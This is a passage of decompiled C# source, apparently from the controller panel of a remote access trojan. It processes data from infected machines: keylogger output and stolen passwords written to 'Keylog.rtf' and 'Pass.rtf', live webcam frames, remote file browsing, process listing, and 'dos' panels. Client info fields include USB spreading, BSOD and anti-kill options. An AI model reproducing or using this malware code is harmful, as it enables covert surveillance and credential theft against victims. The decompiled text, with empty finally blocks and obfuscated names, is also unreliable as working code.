																					kl.ProgressBar1.Value = 0;
																					kl.ProgressBar1.Maximum = array24.Length;
																					foreach (string text11 in array24)
																					{
																						kl.insert(text11);
																						ProgressBar progressBar3 = kl.ProgressBar1;
																						progressBar3.Value++;
																					}
																					kl.T1.ScrollToCaret();
																					kl.ProgressBar1.Value = 0;
																					kl.ToolStripMenuItem1.Enabled = true;
																					flag2 = !Directory.Exists(client.Folder);
																					if (flag2)
																					{
																						Directory.CreateDirectory(client.Folder);
																					}
																					kl.T1.SaveFile(client.Folder + "Keylog.rtf");
																				}
																			}
																			else
																			{
																				flag2 = Operators.CompareString(text, "kl", false) == 0;
																				if (flag2)
																				{
																					flag = Class7.form1_0.InvokeRequired;
																					if (flag)
																					{
																						Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) });
																					}
																					else
																					{
																						flag2 = Class7.smethod_3("kl" + client.ip()) == null;
																						if (flag2)
																						{
																							new kl
																							{
																								c = client,
																								Name = "kl" + client.ip(),
																								Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)))
																							}.Show();
																						}
																						Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_5));
																						Thread thread2 = thread;
																						object[] array26 = new object[2];
																						array26[0] = client;
																						object[] array27 = array26;
																						int num26 = 1;
																						string text12 = "kla" + Class7.string_1 + array2[1];
																						array27[num26] = Class6.smethod_11(ref text12);
																						thread2.Start(array26);
																					}
																				}
																				else
																				{
																					flag2 = Operators.CompareString(text, "passdata", false) == 0;
																					if (flag2)
																					{
																						pas pas = (pas)Class7.smethod_3("pas" + client.ip());
																						pas pas2 = pas;
																						lock (pas2)
																						{
																							pas.T1.Clear();
																							string[] array28 = Strings.Split(Class6.smethod_16(array2[1]), "\r\n", -1, CompareMethod.Binary);
																							pas.ProgressBar1.Value = 0;
																							pas.ProgressBar1.Maximum = array28.Length;
																							foreach (string text13 in array28)
																							{
																								pas.insert(text13);
																								ProgressBar progressBar4 = pas.ProgressBar1;
																								progressBar4.Value++;
																							}
																							pas.T1.ScrollToCaret();
																							pas.ProgressBar1.Value = 0;
																							pas.ToolStripMenuItem1.Enabled = true;
																							flag2 = !Directory.Exists(client.Folder);
																							if (flag2)
																							{
																								Directory.CreateDirectory(client.Folder);
																							}
																							pas.T1.SaveFile(client.Folder + "Pass.rtf");
																						}
																					}
																					else
																					{
																						flag2 = Operators.CompareString(text, "pas", false) == 0;
																						if (flag2)
																						{
																							flag = Class7.form1_0.InvokeRequired;
																							if (flag)
																							{
																								Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) });
																							}
																							else
																							{
																								flag2 = Class7.smethod_3("pas" + client.ip()) == null;
																								if (flag2)
																								{
																									new pas
																									{
																										c = client,
																										Name = "pas" + client.ip(),
																										Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)))
																									}.Show();
																								}
																								Thread thread3 = new Thread(new ParameterizedThreadStart(Class7.smethod_5));
																								Thread thread4 = thread3;
																								object[] array26 = new object[2];
																								array26[0] = client;
																								object[] array30 = array26;
																								int num28 = 1;
																								string text12 = "passdata" + Class7.string_1 + array2[1];
																								array30[num28] = Class6.smethod_11(ref text12);
																								thread4.Start(array26);
																							}
																						}
																						else
																						{
																							flag2 = Operators.CompareString(text, "fun", false) == 0;
																							if (flag2)
																							{
																								flag = Class7.form1_0.InvokeRequired;
																								if (flag)
																								{
																									Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) });
																								}
																								else
																								{
																									flag2 = Class7.smethod_3("fun" + client.ip()) == null;
																									if (flag2)
																									{
																										new fun
																										{
																											s = client,
																											Name = "fun" + client.ip(),
																											Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)))
																										}.Show();
																									}
																									Thread thread5 = new Thread(new ParameterizedThreadStart(Class7.smethod_5));
																								}
																							}
																							else
																							{
																								flag2 = Operators.CompareString(text, "dos", false) == 0;
																								if (flag2)
																								{
																									flag = Class7.form1_0.InvokeRequired;
																									if (flag)
																									{
																										Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) });
																									}
																									else
																									{
																										flag2 = Class7.smethod_3("dos" + client.ip()) == null;
																										if (flag2)
																										{
																											new Dos
																											{
																												s = client,
																												Name = "dos" + client.ip(),
																												Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)))
																											}.Show();
																										}
																										Thread thread6 = new Thread(new ParameterizedThreadStart(Class7.smethod_5));
																									}
																								}
																								else
																								{
																									flag2 = Operators.CompareString(text, "site", false) == 0;
																									if (flag2)
																									{
																										flag = Class7.form1_0.InvokeRequired;
																										if (flag)
																										{
																											Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) });
																										}
																										else
																										{
																											flag2 = Class7.smethod_3("site" + client.ip()) == null;
																											if (flag2)
																											{
																												new OpenSite
																												{
																													s = client,
																													Name = "site" + client.ip(),
																													Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)))
																												}.Show();
																											}
																											Thread thread7 = new Thread(new ParameterizedThreadStart(Class7.smethod_5));
																										}
																									}
																									else
																									{
																										flag2 = Operators.CompareString(text, "ret", false) == 0;
																										if (flag2)
																										{
																											flag = Class7.form1_0.InvokeRequired;
																											if (flag)
																											{
																												Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) });
																											}
																											else
																											{
																												flag2 = Operators.CompareString(array2[1], Class7.smethod_0("pw.dll", null).string_1, false) != 0;
																												if (!flag2)
																												{
																													Pass pass = (Pass)Class7.smethod_3("Pass");
																													flag2 = pass == null;
																													if (flag2)
																													{
																														pass = new Pass();
																														pass.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)));
																														pass.Show();
																													}
																													Pass pass2 = pass;
																													Client client3 = client;
																													string text14 = Class6.smethod_16(array2[2]);
																													string text15 = text14;
																													pass2.XD(ref client3, ref text15);
																												}
																											}
																										}
																										else
																										{
																											flag2 = Operators.CompareString(text, "inf", false) == 0;
																											if (flag2)
																											{
																												flag = client.L == null;
																												if (!flag)
																												{
																													string[] array31 = Strings.Split(Class6.smethod_16(array2[1]), "\r\n", -1, CompareMethod.Binary);
																													string text16 = "+++ Server Info";
																													int num29 = 0;
																													int num30 = array31.Length - 1;
																													for (int num31 = num29; num31 <= num30; num31++)
																													{
																														text16 = string.Concat(new string[]
																														{
																															text16,
																															"\r\n{",
																															Conversions.ToString(num31),
																															"}  ",
																															array31[num31]
																														});
																													}
																													client.L.Cells[0].ToolTipText = string.Format(text16, new object[]
																													{
																														"Name", "Host", "Dir", "Exe", "Copy", "StartUP F", "StartUp R", "BSOD", "Hidden", "Usb Spread",
																														"Kill Process", "Anti Kill"
																													});
																												}
																											}
																											else
																											{
																												flag2 = Operators.CompareString(text, "FM", false) == 0;
																												if (flag2)
																												{
																													Manager manager8 = (Manager)Class7.smethod_3("m" + client.ip());
																													flag2 = manager8 == null;
																													if (!flag2)
																													{
																														string text17 = array2[1];
																														flag2 = Operators.CompareString(text17, "!", false) == 0;
																														if (flag2)
																														{
																															manager8.L1.Items.Clear();
																															int num32 = 0;
																															List<ListViewItem> list6 = new List<ListViewItem>();
																															int num33 = 2;
																															int num34 = array2.Length - 1;
																															for (int num35 = num33; num35 <= num34; num35++)
																															{
																																string[] array32 = Strings.Split(Class6.smethod_16(array2[num35]), "*", -1, CompareMethod.Binary);
																																DirectoryInfo directoryInfo = new DirectoryInfo(array32[0]);
																																ListViewItem listViewItem7 = new ListViewItem(directoryInfo.Name);
																																listViewItem7.ToolTipText = directoryInfo.FullName;
																																listViewItem7.SubItems.Add(array32[1]);
																																string text18 = array32[1];
																																flag2 = Operators.CompareString(text18, DriveType.Fixed.ToString(), false) == 0;
																																if (flag2)
																																{
																																	listViewItem7.ImageIndex = 1;
																																}
																																else
																																{
																																	flag2 = Operators.CompareString(text18, DriveType.Removable.ToString(), false) == 0;
																																	if (flag2)
																																	{
																																		listViewItem7.ImageIndex = 3;
																																	}
																																	else
																																	{
																																		flag2 = Operators.CompareString(text18, DriveType.CDRom.ToString(), false) == 0;
																																		if (flag2)
																																		{
																																			listViewItem7.ImageIndex = 2;
																																		}
																																		else
																																		{
																																			flag2 = Operators.CompareString(text18, string.Empty, false) == 0;
																																			if (flag2)
																																			{
																																				listViewItem7.ImageIndex = 0;
																																				switch (num32)
																																				{
																																				case 0:
																																					listViewItem7.Text = "Desktop";
																																					break;
																																				case 1:
																																					listViewItem7.Text = "MyPictures";
																																					break;
																																				case 2:
																																					listViewItem7.Text = "UserProfile";
																																					break;
																																				case 3:
																																					listViewItem7.Text = "StartUp";
																																					break;
																																				}
																																				num32++;
																																				listViewItem7.SubItems[1].Text = "DIR";
																																			}
																																			else
																																			{
																																				listViewItem7.ImageIndex = ((Operators.CompareString(text18, DriveType.Network.ToString(), false) != 0) ? 1 : 5);
																																			}
																																		}
																																	}
																																}
																																list6.Add(listViewItem7);
																																flag2 = list6.Count > 10;
																																if (flag2)
																																{
																																	manager8.L1.Items.AddRange(list6.ToArray());
																																	list6.Clear();
																																}
																															}
																															flag2 = list6.Count > 0;
																															if (flag2)
																															{
																																manager8.L1.Items.AddRange(list6.ToArray());
																																list6.Clear();
																															}
																															manager8.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
																														}
																														else
																														{
																															flag2 = Operators.CompareString(text17, "@", false) == 0;
																															if (flag2)
																															{
																																ToolStripProgressBar pr4 = manager8.pr;
																																lock (pr4)
																																{
																																	flag2 = manager8.Cache.Contains(Class6.smethod_16(array2[2]));
																																	if (flag2)
																																	{
																																		manager8.Cache.Remove(Class6.smethod_16(array2[2]));
																																	}
																																	Manager.GClass14 gclass2 = new Manager.GClass14();
																																	gclass2.string_0 = Class6.smethod_16(array2[2]);
																																	manager8.Cache.Add(gclass2, gclass2.string_0, null, null);
																																	DirectoryInfo directoryInfo2 = new DirectoryInfo(Class6.smethod_16(array2[2]));
																																	flag2 = Operators.CompareString(manager8.TextBox1.Text, directoryInfo2.FullName, false) != 0;
																																	if (flag2)
																																	{
																																		gclass2.list_1.Clear();
																																		gclass2.list_0.Clear();
																																		try
																																		{
																																			manager8.Cache.Remove(Class6.smethod_16(array2[2]));
																																		}
																																		catch (Exception ex11)
																																		{
																																		}
																																	}
																																	else
																																	{
																																		manager8.pr.Value = 0;
																																		string[] array33 = Strings.Split(array2[3], "*", -1, CompareMethod.Binary);
																																		manager8.pr.Maximum = array33.Length - 1;
																																		manager8.L2.Items.Clear();
																																		flag2 = directoryInfo2.Parent != null;
																																		if (flag2)
																																		{
																																			ListViewItem listViewItem8 = manager8.L2.Items.Add("..", "..", 0);
																																			listViewItem8.ToolTipText = directoryInfo2.Parent.FullName;
																																			listViewItem8.SubItems.Add(string.Empty);
																																			listViewItem8.SubItems.Add("DIR");
																																		}
																																		manager8.vmethod_108.Images.Clear();
																																		manager8.vmethod_108.Images.Add(manager8.MG.Images[0]);
																																		manager8.vmethod_108.Images.Add("*", manager8.MG.Images[4]);
																																		List<ListViewItem> list7 = new List<ListViewItem>();
																																		int num36 = 0;
																																		int num37 = array33.Length - 2;
																																		int num38 = num36;
																																		while (num38 <= num37)
																																		{
																																			flag2 = Operators.CompareString(manager8.TextBox1.Text, directoryInfo2.FullName, false) == 0;
																																			if (flag2)
																																			{
																																				ListViewItem listViewItem9 = new ListViewItem(Class6.smethod_16(array33[num38]), 0);
																																				ListViewItem listViewItem10 = listViewItem9;
																																				listViewItem10.SubItems.Add(string.Empty);
																																				listViewItem10.SubItems.Add("DIR");
																																				listViewItem10.ToolTipText = directoryInfo2.FullName + listViewItem10.Text;
																																				gclass2.list_0.Add(listViewItem10.ToolTipText);
																																				ToolStripProgressBar pr5 = manager8.pr;
																																				pr5.Value++;
																																				list7.Add(listViewItem9);
																																				flag2 = list7.Count > 20;
																																				if (flag2)
																																				{
																																					manager8.L2.Items.AddRange(list7.ToArray());
																																					list7.Clear();
																																				}
																																				num38++;
																																			}
																																			else
																																			{
																																				gclass2.list_1.Clear();
																																				gclass2.list_0.Clear();
																																				try
																																				{
																																					manager8.Cache.Remove(Class6.smethod_16(array2[2]));
																																					return;
																																				}
																																				catch (Exception ex12)
																																				{
																																					return;
																																				}
																																			}
																																		}
																																		flag2 = list7.Count > 0;
																																		if (flag2)
																																		{
																																			manager8.L2.Items.AddRange(list7.ToArray());
																																			list7.Clear();
																																		}
																																		manager8.TextBox1.BackColor = Color.Gainsboro;
																																		manager8.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
																																		client.Send(string.Concat(new string[]
																																		{
																																			"Ex",
																																			Class7.string_1,
																																			"fm",
																																			Class7.string_1,
																																			"@",
																																			Class7.string_1,
																																			array2[2]
																																		}));
																																		manager8.pr.Value = 0;
																																	}
																																}
																															}
																															else
																															{
																																flag2 = Operators.CompareString(text17, "#", false) == 0;
																																if (flag2)
																																{
																																	ToolStripProgressBar pr6 = manager8.pr;
																																	lock (pr6)
																																	{
																																		string text19 = Class6.smethod_16(array2[2]);
																																		flag2 = Operators.CompareString(manager8.TextBox1.Text, text19, false) != 0;
																																		if (!flag2)
																																		{
																																			Manager.GClass14 gclass3 = (Manager.GClass14)manager8.Cache[Class6.smethod_16(array2[2])];
																																			gclass3.list_1.Clear();
																																			manager8.pr.Value = 0;
																																			string[] array34 = Strings.Split(array2[3], "*", -1, CompareMethod.Binary);
																																			manager8.pr.Maximum = array34.Length - 1;
																																			List<ListViewItem> list8 = new List<ListViewItem>();
																																			int num39 = 0;
																																			int num40 = array34.Length - 2;
																																			int num41 = num39;
																																			while (num41 <= num40)
																																			{
																																				string[] array35 = Strings.Split(Class6.smethod_16(array34[num41]), "*", -1, CompareMethod.Binary);
																																				flag2 = Operators.CompareString(manager8.TextBox1.Text, text19, false) == 0;
																																				if (flag2)
																																				{
																																					ListViewItem listViewItem11 = new ListViewItem(array35[0]);
																																					ListViewItem listViewItem12 = listViewItem11;
																																					FileInfo fileInfo = new FileInfo(text19 + array35[0]);
																																					listViewItem12.ToolTipText = fileInfo.FullName;
																																					listViewItem12.SubItems.Add(Class6.smethod_17(Conversions.ToLong(array35[1])));
																																					listViewItem12.Name = listViewItem12.ToolTipText;
																																					flag2 = array35.Length == 2;
																																					if (flag2)
																																					{
																																						flag = Operators.CompareString(fileInfo.Extension, string.Empty, false) == 0;
																																						if (flag)
																																						{
																																							listViewItem12.SubItems.Add(string.Empty);
																																							listViewItem12.ImageKey = "*";
																																						}
																																						else
																																						{
																																							listViewItem12.SubItems.Add(fileInfo.Extension.Replace(".", string.Empty));
																																							flag2 = !manager8.vmethod_108.Images.ContainsKey(fileInfo.Extension);
																																							if (flag2)
																																							{
																																								File.Create(Application.StartupPath + "\\!" + fileInfo.Extension).Close();
																																								manager8.vmethod_108.Images.Add(fileInfo.Extension, Icon.ExtractAssociatedIcon(Application.StartupPath + "\\!" + fileInfo.Extension));
																																								File.Delete(Application.StartupPath + "\\!" + fileInfo.Extension);
																																								listViewItem12.ImageKey = fileInfo.Extension;
																																							}
																																							else
																																							{
																																								listViewItem12.ImageKey = fileInfo.Extension;
																																							}
																																						}
																																					}
																																					else
																																					{
																																						listViewItem12.SubItems.Add(fileInfo.Extension.Remove(0, 1));
																																						flag2 = !manager8.vmethod_108.Images.ContainsKey(listViewItem12.ToolTipText);
																																						if (flag2)
																																						{
																																							manager8.vmethod_108.Images.Add(listViewItem12.ToolTipText, Image.FromStream(new MemoryStream(Convert.FromBase64String(array35[2]))));
																																						}
																																						flag2 = !manager8.Images.Contains("!" + listViewItem12.ToolTipText);
																																						if (flag2)
																																						{
																																							manager8.Images.Add(manager8.vmethod_108.Images[listViewItem12.ToolTipText], "!" + listViewItem12.ToolTipText, null, null);
																																						}
																																						listViewItem12.ImageKey = listViewItem12.ToolTipText;
																																					}
																																					gclass3.list_1.Add(string.Concat(new string[]
																																					{
																																						listViewItem12.ToolTipText,
																																						"*",
																																						listViewItem12.SubItems[1].Text,
																																						"*",
																																						listViewItem12.SubItems[2].Text
																																					}));
																																					ToolStripProgressBar pr7 = manager8.pr;
																																					pr7.Value++;
																																					list8.Add(listViewItem11);
																																					flag2 = list8.Count > 20;
																																					if (flag2)
																																					{
																																						manager8.L2.Items.AddRange(list8.ToArray());
																																						list8.Clear();
																																					}
																																					num41++;
																																				}
																																				else
																																				{
																																					gclass3.list_1.Clear();
																																					gclass3.list_0.Clear();
																																					try
																																					{
																																						manager8.Cache.Remove(Class6.smethod_16(array2[2]));
																																						return;
																																					}
																																					catch (Exception ex13)
																																					{
																																						return;
																																					}
																																				}
																																			}
																																			flag2 = list8.Count > 0;
																																			if (flag2)
																																			{
																																				manager8.L2.Items.AddRange(list8.ToArray());
																																				list8.Clear();
																																			}
																																			manager8.TextBox1.BackColor = Color.WhiteSmoke;
																																			manager8.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
																																			manager8.pr.Value = 0;
																																		}
																																	}
																																}
																																else
																																{
																																	flag2 = Operators.CompareString(text17, "$", false) == 0;
																																	if (flag2)
																																	{
																																		flag = manager8.Images.Contains(Class6.smethod_16(array2[2]));
																																		if (flag)
																																		{
																																			manager8.Images.Remove(Class6.smethod_16(array2[2]));
																																		}
																																		manager8.Images.Add(Image.FromStream(new MemoryStream((byte[])NewLateBinding.LateIndexGet(Class6.smethod_9(array, array2[2] + Class7.string_1), new object[] { RuntimeHelpers.GetObjectValue(1) }, null))), Class6.smethod_16(array2[2]), null, null);
																																		flag2 = !manager8.L2.Items.ContainsKey(Class6.smethod_16(array2[2])) || !manager8.L2.Items[Class6.smethod_16(array2[2])].Selected;
																																		if (!flag2)
																																		{
																																			manager8.p.Image = (Image)manager8.Images[Class6.smethod_16(array2[2])];
																																			manager8.p.Visible = true;
																																		}
																																	}
																																	else
																																	{
																																		flag2 = Operators.CompareString(text17, "%", false) == 0;
																																		if (flag2)
																																		{
																																			flag = Class7.form1_0.InvokeRequired;
																																			if (flag)
																																			{
																																				Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) });
																																			}
																																			else
																																			{
																																				Note note = new Note();
																																				note.FN = Class6.smethod_16(array2[2]);
																																				note.Text = manager8.Text + " - " + note.FN;
																																				note.SK = manager8.sk;
																																				note.TextBox1.Text = Class6.smethod_16(array2[3]).Replace("\0", string.Empty);
																																				note.Show();
																																				note.ToolStripMenuItem1.Enabled = false;
																																			}
																																		}
																																		else
																																		{
																																			flag2 = Operators.CompareString(text17, "dl", false) == 0;
																																			if (flag2)
																																			{
																																				string[] array36 = Strings.Split(Class6.smethod_16(array2[2]), "*", -1, CompareMethod.Binary);
																																				try
																																				{
																																					try
																																					{
																																						foreach (object obj4 in manager8.L2.Items)
																																						{
																																							ListViewItem listViewItem13 = (ListViewItem)obj4;
																																							flag2 = Operators.CompareString(array36[1], "!", false) == 0;
																																							if (flag2)
																																							{
																																								flag = (Operators.CompareString(listViewItem13.Text, new DirectoryInfo(array36[0]).Name, false) == 0) & (Operators.CompareString(listViewItem13.SubItems[2].Text, "DIR", false) == 0);
																																								if (flag)
																																								{
																																									listViewItem13.Remove();
																																									break;
																																								}
																																							}
																																							else
																																							{
																																								flag2 = (Operators.CompareString(listViewItem13.Text, new DirectoryInfo(array36[0]).Name, false) == 0) & (Operators.CompareString(listViewItem13.SubItems[2].Text, "DIR", false) != 0);
																																								if (flag2)
																																								{
																																									listViewItem13.Remove();
																																									break;
																																								}
																																							}
																																						}
																																					}
																																					finally
																																					{
																																						IEnumerator enumerator7;
																																						
																																						
																																					}
																																				}
																																				finally
																																				{
																																					
																																				}
																																			}
																																			else
																																			{
																																				flag2 = Operators.CompareString(text17, "nm", false) == 0;
																																				if (flag2)
																																				{
																																					string[] array37 = Strings.Split(Class6.smethod_16(array2[2]), "*", -1, CompareMethod.Binary);
																																					try
																																					{
																																						try
																																						{
																																							foreach (object obj5 in manager8.L2.Items)
																																							{
																																								ListViewItem listViewItem14 = (ListViewItem)obj5;
																																								flag2 = Operators.CompareString(listViewItem14.ToolTipText, array37[0], false) == 0;
																																								if (flag2)
																																								{
																																									flag = Operators.CompareString(array37[2], "*", false) == 0;
																																									if (flag)
																																									{
																																										DirectoryInfo directoryInfo3 = new DirectoryInfo(array37[0]);
																																										listViewItem14.Text = array37[1];
																																										listViewItem14.ToolTipText = directoryInfo3.Parent.FullName + "\\" + listViewItem14.Text;
																																									}
																																									else
																																									{
																																										FileInfo fileInfo2 = new FileInfo(array37[0]);
																																										listViewItem14.Text = array37[1];
																																										listViewItem14.ToolTipText = fileInfo2.Directory.FullName + "\\" + listViewItem14.Text;
																																										listViewItem14.SubItems[2].Text = new FileInfo(listViewItem14.ToolTipText).Extension.Replace(".", string.Empty);
																																									}
																																								}
																																							}
																																						}
																																						finally
																																						{
																																							
																																						}
																																					}
																																					finally
																																					{
																																						
																																					}
																																				}
																																				else
																																				{
																																					flag2 = Operators.CompareString(text17, "ER", false) != 0;
																																					if (!flag2)
																																					{
																																						manager8.SL.Text = array2[3];
																																						flag2 = !array2[3].StartsWith("UnRAR_");
																																						if (!flag2)
																																						{
																																							ToolStripProgressBar pr8 = manager8.pr;
																																							lock (pr8)
																																							{
																																								FileInfo fileInfo3 = new FileInfo(array2[3]);
																																								flag2 = Operators.CompareString(fileInfo3.Directory.FullName.ToLower() + "\\", manager8.TextBox1.Text.ToLower(), false) != 0;
																																								if (!flag2)
																																								{
																																									ListViewItem listViewItem15 = manager8.L2.Items.Add(fileInfo3.FullName, fileInfo3.Name, 0);
																																									listViewItem15.SubItems.Add(string.Empty);
																																									listViewItem15.SubItems.Add("DIR");
																																								}
																																							}
																																						}
																																					}
																																				}
																																			}
																																		}
																																	}
																																}
																															}
																														}
																													}
																												}
																												else
																												{
																													flag2 = Operators.CompareString(text, "CAM", false) == 0;
																													if (flag2)
																													{
																														flag = client.osk == null;
																														if (flag)
																														{
																															client.isPL = true;
																															try
																															{
																																client.osk = Class7.sk_0.GetClient(array2[1]);
																															}
																															catch (Exception ex14)
																															{
																																client.CN = false;
																															}
																														}
																														Cam cam = (Cam)Class7.smethod_3("cam" + client.ip());
																														string text20 = array2[2];
																														flag2 = Operators.CompareString(text20, "~", false) == 0;
																														if (flag2)
																														{
																															flag = cam == null;
																															if (flag)
																															{
																																bool flag5 = Class7.form1_0.InvokeRequired;
																																if (flag5)
																																{
																																	Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) });
																																}
																																else
																																{
																																	Cam cam2 = new Cam();
																																	cam2.sk = client;
																																	cam2.osk = client.osk;
																																	cam2.Name = "cam" + client.ip();
																																	int num42 = 3;
																																	int num43 = array2.Length - 1;
																																	for (int num44 = num42; num44 <= num43; num44++)
																																	{
																																		cam2.ComboBox1.SelectedIndex = cam2.ComboBox1.Items.Add(array2[num44]);
																																	}
																																	cam2.Show();
																																}
																															}
																															else
																															{
																																int num45 = 3;
																																int num46 = array2.Length - 1;
																																for (int num47 = num45; num47 <= num46; num47++)
																																{
																																	cam.ComboBox1.SelectedIndex = cam.ComboBox1.Items.Add(array2[num47]);
																																}
																															}
																														}
																														else
																														{
																															bool flag5 = Operators.CompareString(text20, "!", false) == 0;
																															if (flag5)
																															{
																																flag2 = cam == null;
																																if (!flag2)
																																{
																																	Cam cam3 = cam;
																																	cam3.fps++;
																																	cam.pkt = array.Length;
																																	Thread.Sleep(10);
																																	flag5 = array2[3].Length == 1;
																																	if (!flag5)
																																	{
																																		Image image = Image.FromStream(new MemoryStream((byte[])NewLateBinding.LateIndexGet(Class6.smethod_9(array, array2[2] + Class7.string_1), new object[] { RuntimeHelpers.GetObjectValue(1) }, null)));
																																		flag5 = cam.CheckBox3.Checked;
																																		if (flag5)
																																		{
																																			try
																																			{
																																				image.Save(cam.folder + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg");
																																			}
																																			catch (Exception ex15)
																																			{
																																			}
																																		}
																																		cam.PictureBox1.Image = image;
																																	}
																																}
																															}
																															else
																															{
																																flag5 = Operators.CompareString(text20, "@", false) != 0 || cam == null;
																																if (!flag5)
																																{
																																	cam.Button1.Text = "Start";
																																}
																															}
																														}
																													}
																													else
																													{
																														bool flag5 = Operators.CompareString(text, "proc", false) == 0;
																														if (flag5)
																														{
																															Manager manager9 = (Manager)Class7.smethod_3("m" + client.ip());
																															flag5 = manager9 == null;
																															if (!flag5)
																															{
																																ToolStripProgressBar pr9 = manager9.pr;
																																lock (pr9)
																																{
																																	string text21 = array2[1];
																																	flag5 = Operators.CompareString(text21, "pid", false) == 0;
																																	if (flag5)
																																	{
																																		manager9.PID = Conversions.ToInteger(array2[2]);
																																	}
																																	else
																																	{
																																		flag5 = Operators.CompareString(text21, "!", false) == 0;
																																		if (flag5)
																																		{
																																			Manager manager10 = manager9;
																																			lock (manager10)
																																			{
																																				string[] array38 = Strings.Split(array2[2], "[::]", -1, CompareMethod.Binary);
																																				bool flag6 =false;
																																				flag5 = !Class7.InlineAssignHelper<bool>(ref flag6, manager9.LPR.Items.Count == 0);
																																				if (flag5)
																																				{
																																					try
																																					{
																																						try
																																						{
																																							foreach (object obj6 in manager9.LPR.Items)
																																							{
																																								ListViewItem listViewItem16 = (ListViewItem)obj6;
																																								flag2 = listViewItem16.ForeColor == Color.GreenYellow;
																																								if (flag2)
																																								{
																																									try
																																									{
																																										try
																																										{
																																											foreach (object obj7 in listViewItem16.SubItems)
																																											{
																																												ListViewItem.ListViewSubItem listViewSubItem = (ListViewItem.ListViewSubItem)obj7;
																																												listViewSubItem.ForeColor = manager9.LPR.ForeColor;
																																											}
																																										}
																																										finally
																																										{
																																											
																																										}
																																									}
																																									finally
																																									{
																																										
																																									}
																																								}
																																							}
																																						}
																																						finally
																																						{
																																							
																																						}
																																					}
																																					finally
																																					{
																																						
																																					}
																																				}
																																				flag5 = array38.Length > 1;
																																				if (flag5)
																																				{
																																					manager9.pr.Value = 0;
																																					manager9.pr.Maximum = array38.Length;
																																					List<ListViewItem> list9 = new List<ListViewItem>();
																																					foreach (string text22 in array38)
																																					{
																																						string[] array40 = Strings.Split(text22, "[:]", -1, CompareMethod.Binary);
																																						flag5 = Operators.CompareString(text22, string.Empty, false) != 0;
																																						if (!flag5)
																																						{
																																							break;
																																						}
																																						flag2 = array40[2].StartsWith("\\??\\");
																																						if (flag2)
																																						{
																																							array40[2] = array40[2].Remove(0, "\\??\\".Length);
																																						}
																																						try
																																						{
																																							ToolStripProgressBar pr10 = manager9.pr;
																																							pr10.Value++;
																																						}
																																						catch (Exception ex16)
																																						{
																																						}
																																						ListViewItem listViewItem17 = new ListViewItem(array40[0]);
																																						listViewItem17.SubItems.Add(array40[1]);
																																						listViewItem17.Name = array40[1];
																																						flag5 = array40[2].Contains(":\\");
																																						if (flag5)
																																						{
																																							listViewItem17.SubItems.Add(new FileInfo(array40[2].Replace("\"", string.Empty)).Directory.Name);
																																							listViewItem17.ToolTipText = array40[2].Replace("\"", string.Empty);
																																						}
																																						else
																																						{
																																							listViewItem17.SubItems.Add(string.Empty);
																																						}
																																						string text23 = " ";
																																						listViewItem17.SubItems.Add(array40[3]);
																																						flag5 = array40[4].StartsWith("\"");
																																						if (flag5)
																																						{
																																							text23 = "\"";
																																							array40[4] = array40[4].Remove(0, 1);
																																						}
																																						flag5 = array40[4].Contains(text23);
																																						if (flag5)
																																						{
																																							array40[4] = array40[4].Remove(0, Strings.InStr(array40[4], text23, CompareMethod.Binary));
																																							flag5 = array40[4].StartsWith(" ");
																																							if (flag5)
																																							{
																																								array40[4] = array40[4].Remove(0, 1);
																																							}
																																							listViewItem17.SubItems.Add(array40[4]);
																																						}
																																						else
																																						{
																																							listViewItem17.SubItems.Add(string.Empty);
																																						}
																																						flag5 = !flag6;
																																						if (flag5)
																																						{
																																							listViewItem17.ForeColor = Color.GreenYellow;
																																						}
																																						flag5 = Conversions.ToInteger(array40[1]) == manager9.PID;
																																						if (flag5)
																																						{
																																							listViewItem17.ForeColor = Color.Red;
																																						}
																																						list9.Add(listViewItem17);
																																						flag5 = list9.Count > 10;
																																						if (flag5)
																																						{
																																							manager9.LPR.Items.AddRange(list9.ToArray());
																																							list9.Clear();
																																						}
																																					}
																																					flag5 = list9.Count > 0;
																																					if (flag5)
																																					{
																																						manager9.LPR.Items.AddRange(list9.ToArray());
																																						list9.Clear();
																																					}
																																					flag5 = manager9.PRFX;
																																					if (flag5)
																																					{
																																						manager9.PRFX = false;
																																						manager9.LPR.method_3();
																																					}
																																					ColumnHeader columnHeader_3 = manager9.LPR.columnHeader_0;
																																					flag5 = columnHeader_3 == null;
																																					if (flag5)
																																					{
